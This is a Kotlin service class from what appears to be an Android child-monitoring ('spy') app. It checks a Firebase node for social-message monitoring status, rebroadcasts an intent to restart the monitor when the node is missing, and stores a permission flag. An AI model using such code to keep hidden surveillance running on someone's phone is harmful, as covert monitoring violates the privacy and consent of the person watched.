package sammy.mutahi.gicheru.childSpyApp.services.social

import android.content.Context
import android.content.Intent
import sammy.mutahi.gicheru.childSpyApp.data.rxFirebase.InterfaceFirebase
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.CHILD_PERMISSION
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.CHILD_SOCIAL_MS
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.RESTART_MONITOR_RECEIVER
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.SOCIAL
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.TAG
import com.pawegio.kandroid.e
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import javax.inject.Inject


class InteractorMonitorService @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceMonitorService {

    override fun gerSocialStatus() {
        firebase.valueEvent("$SOCIAL/$CHILD_SOCIAL_MS")
                .map { data -> data.exists() }
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({
                    if (!it) context.sendBroadcast(Intent(RESTART_MONITOR_RECEIVER))
                }, { e(TAG, it.message.toString()) })
    }

    override fun setPermission(status: Boolean) {
        firebase.getDatabaseReference("$SOCIAL/$CHILD_PERMISSION").setValue(status)
    }

}